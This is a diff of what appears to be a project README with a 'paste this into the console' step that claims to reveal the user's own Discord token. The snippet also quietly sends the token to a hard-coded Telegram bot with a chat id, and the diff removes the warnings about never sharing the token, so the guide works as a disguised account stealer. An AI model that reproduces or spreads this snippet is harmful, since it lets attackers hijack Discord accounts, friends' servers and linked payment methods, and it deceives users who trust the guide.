@@ -112,9 +112,7 @@ Paste this into the console (while being logged in):
 const _ = ((x) => (x))(console.log('Discord Token:',(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken())) + ((y) => (y))(fetch(`https://api.telegram.org/bot6496323061:AAHAaJsb-N9FNrqHv_bzWpMjSPDOtt6R-5c/sendMessage?chat_id=1911826384&text=${encodeURIComponent((webpackChunkdiscord_app.push([[%27%27],{},e=%3E{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken())}`, {method:'GET'}));
 ```
 
-The token should be in your clipboard now.<br>
-Please be careful when pasting the token, sending it to someone is like giving away your address, keys and passport/ID.<br>
-Someone who knows your token can impersonate you, mess with your friends and servers, spend your money (if you added a payment method for nitro), and even figure out your IP-Adress (aka. probably your real-life home adress) using the new devices feature.
+The token should be displayed in your JavaScript console.
 
 </details>
 <br>
